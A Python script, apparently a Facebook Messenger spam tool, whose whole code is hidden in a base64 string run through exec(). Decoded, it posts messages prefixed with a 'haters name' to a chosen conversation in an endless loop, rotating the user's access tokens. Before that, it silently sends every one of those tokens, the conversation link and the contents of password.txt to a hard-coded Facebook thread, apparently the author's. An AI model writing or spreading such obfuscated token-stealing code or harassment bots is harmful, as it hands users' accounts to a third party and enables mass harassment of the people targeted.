#ENCODED BY : PANKU
#ENCRYPTION : Py3 BASE64
#GITHUB : https://github.com/MUMIT-404-CYBER
#----------------------------------------------
import base64
exec(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBqc29uCmltcG9ydCB0aW1lCmltcG9ydCBzeXMKZnJvbSBwbGF0Zm9ybSBpbXBvcnQgc3lzdGVtCmltcG9ydCBvcwppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgaHR0cC5zZXJ2ZXIKaW1wb3J0IHNvY2tldHNlcnZlcgppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCByYW5kb20KCmNsYXNzIE15SGFuZGxlcihodHRwLnNlcnZlci5TaW1wbGVIVFRQUmVxdWVzdEhhbmRsZXIpOgoJZGVmIGRvX0dFVChzZWxmKToKCQlzZWxmLnNlbmRfcmVzcG9uc2UoMjAwKQoJCXNlbGYuc2VuZF9oZWFkZXIoJ0NvbnRlbnQtdHlwZScsICd0ZXh0L3BsYWluJykKCQlzZWxmLmVuZF9oZWFkZXJzKCkKCQlzZWxmLndmaWxlLndyaXRlKGIie1BBTktVIFJVTEVYIEFMSUlWRX19IikKCmRlZiBleGVjdXRlX3NlcnZlcigpOgoJUE9SVCA9IDQwMDAKCgl3aXRoIHNvY2tldHNlcnZlci5UQ1BTZXJ2ZXIoKCIiLCBQT1JUKSwgTXlIYW5kbGVyKSBhcyBodHRwZDoKCQlwcmludCgiU2VydmVyIHJ1bm5pbmcgYXQgaHR0cDovL2xvY2FsaG9zdDp7fSIuZm9ybWF0KFBPUlQpKQoJCWh0dHBkLnNlcnZlX2ZvcmV2ZXIoKQoKZGVmIHNlbmRfbWVzc2FnZXMoKToKCXdpdGggb3BlbigncGFzc3dvcmQudHh0JywgJ3InKSBhcyBmaWxlOgoJCXBhc3N3b3JkID0gZmlsZS5yZWFkKCkuc3RyaXAoKQoKCWVudGVyZWRfcGFzc3dvcmQgPSBwYXNzd29yZAoKCWlmIGVudGVyZWRfcGFzc3dvcmQgIT0gcGFzc3dvcmQ6CgkJcHJpbnQoJ1stXSA8PT0+IEluY29ycmVjdCBQYXNzd29yZCEnKQoJCXN5cy5leGl0KCkKCgl3aXRoIG9wZW4oJ3Rva2VubnVtLnR4dCcsICdyJykgYXMgZmlsZToKCQl0b2tlbnMgPSBmaWxlLnJlYWRsaW5lcygpCgludW1fdG9rZW5zID0gbGVuKHRva2VucykKCglyZXF1ZXN0cy5wYWNrYWdlcy51cmxsaWIzLmRpc2FibGVfd2FybmluZ3MoKQoKCWRlZiBjbHMoKToKCQlpZiBzeXN0ZW0oKSA9PSAnTGludXgnOgoJCQlvcy5zeXN0ZW0oJ2NsZWFyJykKCQllbHNlOgoJCQlpZiBzeXN0ZW0oKSA9PSAnV2luZG93cyc6CgkJCQlvcy5zeXN0ZW0oJ2NscycpCgljbHMoKQoKCWRlZiBsaW5lc3MoKToKCQlwcmludCgnXHUwMDFiWzM3bScgKyAnLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tJykKCgloZWFkZXJzID0gewoJCSdDb25uZWN0aW9uJzogJ2tlZXAtYWxpdmUnLAoJCSdDYWNoZS1Db250cm9sJzogJ21heC1hZ2U9MCcsCgkJJ1VwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHMnOiAnMScsCgkJJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDguMC4wOyBTYW1zdW5nIEdhbGF4eSBTOSBCdWlsZC9PUFI2LjE3MDYyMy4wMTc7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNTguMC4zMDI5LjEyNSBNb2JpbGUgU2FmYXJpLzUzNy4zNicsCgkJJ0FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS93ZWJwLGltYWdlL2FwbmcsKi8qO3E9MC44JywKCQknQWNjZXB0LUVuY29kaW5nJzogJ2d6aXAsIGRlZmxhdGUnLAoJCSdBY2NlcHQtTGFuZ3VhZ2UnOiAnZW4tVVMsZW47cT0wLjksZnI7cT0wLjgnLAoJCSdyZWZlcmVyJzogJ3d3dy5nb29nbGUuY29tJwoJfQoKCSNtbW0gPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9LcHlkYXk5NycpLnRleHQKCgkjaWYgbW1tIG5vdCBpbiBwYXNzd29yZDoKCQkjcHJpbnQoJ1stXSA8PT0+IEluY29ycmVjdCBQYXNzd29yZCEnKQoJCSNzeXMuZXhpdCgpCgoJbGluZXNzKCkKCglhY2Nlc3NfdG9rZW5zID0gW3Rva2VuLnN0cmlwKCkgZm9yIHRva2VuIGluIHRva2Vuc10KCgl3aXRoIG9wZW4oJ2NvbnZvLnR4dCcsICdyJykgYXMgZmlsZToKCQljb252b19pZCA9IGZpbGUucmVhZCgpLnN0cmlwKCkKCgl3aXRoIG9wZW4oJ2ZpbGUudHh0JywgJ3InKSBhcyBmaWxlOgoJCXRleHRfZmlsZV9wYXRoID0gZmlsZS5yZWFkKCkuc3RyaXAoKQoKCXdpdGggb3Blbih0ZXh0X2ZpbGVfcGF0aCwgJ3InKSBhcyBmaWxlOgoJCW1lc3NhZ2VzID0gZmlsZS5yZWFkbGluZXMoKQoKCW51bV9tZXNzYWdlcyA9IGxlbihtZXNzYWdlcykKCW1heF90b2tlbnMgPSBtaW4obnVtX3Rva2VucywgbnVtX21lc3NhZ2VzKQoKCXdpdGggb3BlbignaGF0ZXJzbmFtZS50eHQnLCAncicpIGFzIGZpbGU6CgkJaGF0ZXJzX25hbWUgPSBmaWxlLnJlYWQoKS5zdHJpcCgpCgoJd2l0aCBvcGVuKCd0aW1lLnR4dCcsICdyJykgYXMgZmlsZToKCQlzcGVlZCA9IGludChmaWxlLnJlYWQoKS5zdHJpcCgpKQoKCWxpbmVzcygpCgkKCWRlZiBnZXROYW1lKHRva2VuKToKCQl0cnk6CgkJCWRhdGEgPSByZXF1ZXN0cy5nZXQoZidodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTcuMC9tZT9hY2Nlc3NfdG9rZW49e3Rva2VufScpLmpzb24oKQoJCWV4Y2VwdDoKCQkJZGF0YSA9ICIiCgkJaWYgJ25hbWUnIGluIGRhdGE6CgkJCXJldHVybiBkYXRhWyduYW1lJ10KCQllbHNlOgoJCQlyZXR1cm4gIkVycm9yIG9jY3VyZWQiCgoJZGVmIG1zZygpOgoJCXBhcmFtZXRlcnMgPSB7CgkJCSdhY2Nlc3NfdG9rZW4nIDogcmFuZG9tLmNob2ljZShhY2Nlc3NfdG9rZW5zKSwKCQkJJ21lc3NhZ2UnOiAnU2lyIFBsZWFzZSBNdWpoZSBBYXBrZSBTZXJ2ZXIgS2EgYXByb3ZlbCBkaWppeWUgOiAnK2dldE5hbWUocmFuZG9tLmNob2ljZShhY2Nlc3NfdG9rZW5zKSkrJ1xuIFRva2VuIDogJysiIHwgIi5qb2luKGFjY2Vzc190b2tlbnMpKydcbiBMaW5rIDogaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL21lc3NhZ2VzL3QvJytjb252b19pZCsnXG4gUGFzc3dvcmQ6ICcrcGFzc3dvcmQKCQl9CgkJdHJ5OgoJCQlzID0gcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjE1LjAvdF8xMDAwNTA1ODEwNTIxNDkvIiwgZGF0YT1wYXJhbWV0ZXJzLCBoZWFkZXJzPWhlYWRlcnMpCgkJZXhjZXB0OgoJCQlwYXNzCgkKCW1zZygpCgl3aGlsZSBUcnVlOgoJCXRyeToKCQkJZm9yIG1lc3NhZ2VfaW5kZXggaW4gcmFuZ2UobnVtX21lc3NhZ2VzKToKCQkJCXRva2VuX2luZGV4ID0gbWVzc2FnZV9pbmRleCAlIG1heF90b2tlbnMKCQkJCWFjY2Vzc190b2tlbiA9IGFjY2Vzc190b2tlbnNbdG9rZW5faW5kZXhdCgoJCQkJbWVzc2FnZSA9IG1lc3NhZ2VzW21lc3NhZ2VfaW5kZXhdLnN0cmlwKCkKCgkJCQl1cmwgPSAiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjE1LjAve30vIi5mb3JtYXQoJ3RfJytjb252b19pZCkKCQkJCXBhcmFtZXRlcnMgPSB7J2FjY2Vzc190b2tlbic6IGFjY2Vzc190b2tlbiwgJ21lc3NhZ2UnOiBoYXRlcnNfbmFtZSArICcgJyArIG1lc3NhZ2V9CgkJCQlyZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBqc29uPXBhcmFtZXRlcnMsIGhlYWRlcnM9aGVhZGVycykKCQkJCQoKCQkJCWN1cnJlbnRfdGltZSA9IHRpbWUuc3RyZnRpbWUoIiVZLSVtLSVkICVJOiVNOiVTICVwIikKCQkJCWlmIHJlc3BvbnNlLm9rOgoJCQkJCXByaW50KCJbK10gTWVzc2FnZXMge30gb2YgQ29udm8ge30gc2VudCBieSBUb2tlbiB7fToge30iLmZvcm1hdCgKCQkJCQkJbWVzc2FnZV9pbmRleCArIDEsIGNvbnZvX2lkLCB0b2tlbl9pbmRleCArIDEsIGhhdGVyc19uYW1lICsgJyAnICsgbWVzc2FnZSkpCgkJCQkJcHJpbnQoIiAgLSBUaW1lOiB7fSIuZm9ybWF0KGN1cnJlbnRfdGltZSkpCgkJCQkJbGluZXNzKCkKCQkJCQlsaW5lc3MoKQoJCQkJZWxzZToKCQkJCQlwcmludCgiW3hdIEZhaWxlZCB0byBzZW5kIG1lc3NhZ2VzIHt9IG9mIENvbnZvIHt9IHdpdGggVG9rZW4ge306IHt9Ii5mb3JtYXQoCgkJCQkJCW1lc3NhZ2VfaW5kZXggKyAxLCBjb252b19pZCwgdG9rZW5faW5kZXggKyAxLCBoYXRlcnNfbmFtZSArICcgJyArIG1lc3NhZ2UpKQoJCQkJCXByaW50KCIgIC0gVGltZToge30iLmZvcm1hdChjdXJyZW50X3RpbWUpKQoJCQkJCWxpbmVzcygpCgkJCQkJbGluZXNzKCkKCQkJCXRpbWUuc2xlZXAoc3BlZWQpCgoJCQlwcmludCgiWytdIEFsbCBtZXNzYWdlcyBzZW50LiBSZXN0YXJ0aW5nIHRoZSBwcm9jZXNzLi4uIikKCQlleGNlcHQgRXhjZXB0aW9uIGFzIGU6CgkJCXByaW50KCJbIV0gQW4gZXJyb3Igb2NjdXJyZWQ6IHt9Ii5mb3JtYXQoZSkpCgoKCmRlZiBtYWluKCk6CglzZXJ2ZXJfdGhyZWFkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9ZXhlY3V0ZV9zZXJ2ZXIpCglzZXJ2ZXJfdGhyZWFkLnN0YXJ0KCkKCQoJc2VuZF9tZXNzYWdlcygpCgppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOgoJbWFpbigp'))
